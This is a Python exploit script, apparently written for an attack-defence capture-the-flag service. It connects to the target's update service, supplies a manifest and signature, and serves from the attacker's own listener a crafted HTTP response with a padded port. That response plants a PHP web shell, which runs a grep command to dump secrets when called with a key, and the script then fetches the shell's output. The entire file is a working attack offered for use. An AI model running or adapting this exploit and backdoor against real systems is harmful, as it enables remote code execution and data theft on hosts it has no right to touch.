#!/usr/bin/python3

import socket
import requests
import sys

if len(sys.argv) < 3:
    print("Usage: ./startup_sploit <host> <my_ip>")
    exit(1)

PORT = 3255
HOST = sys.argv[1]
MYIP = sys.argv[2]
MYPORT = "0" * (921-len(MYIP)) + "4000"

MANIFEST = '{"links": [{"url": "http://mirror/wyjzmw.php", "checksum": "32bfce7a147d2fb0c87ff234c2848a37"}, {"url": "http://mirror/JhXY.php", "checksum": "d55ec508be338092ab591f3d7e4ab929"}]}'
SIGNATURE = 'c2f5e7a6e44e2fc4076a5930df75b02220c5f9313e0f3faa7ecb4e281dca359bc12426715e7c2902934e6995c9cdbcda93b8c4e0e5993f25309267b79978f504'

FAKE_PHP = br"""<?php if($_GET["key"]=="KnfSM")system("grep '=\";' *")?>"""

PAYLOAD = b"""AAAAAA
Url: http://%s:%s/JhXY.php
Success: true
Hashsum: d55ec508be338092ab591f3d7e4ab929\n\n\n\n\n\n\n\n\n\n
Content-Length: %d
%s""" % (MYIP.encode(), MYPORT.encode(), len(FAKE_PHP), FAKE_PHP)

ANS = b"""HTTP/1.1 200 OK
Content-Length: %d

%s?>""" % (len(PAYLOAD), PAYLOAD)


c = socket.socket()
c.connect((HOST, PORT))

from_client = c.makefile("r")
to_client = c.makefile("w")

print(from_client.readline().strip())
print(from_client.readline().strip())

to_client.write("%s:%s\n" % (MYIP, MYPORT)); to_client.flush()
print(from_client.readline().strip())

to_client.write(MANIFEST+"\n"); to_client.flush()
print(from_client.readline().strip())

to_client.write(SIGNATURE+"\n"); to_client.flush()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", int(MYPORT)))
s.listen()
cl, cl_info = s.accept()

print("Got connection from %s, sending files" % (cl_info, ))
cl.sendall(ANS)

print(from_client.readline().strip())
print(from_client.readline().strip())
print(from_client.readline().strip())

print(requests.get("http://%s/JhXY.php?key=KnfSM" % HOST).text)
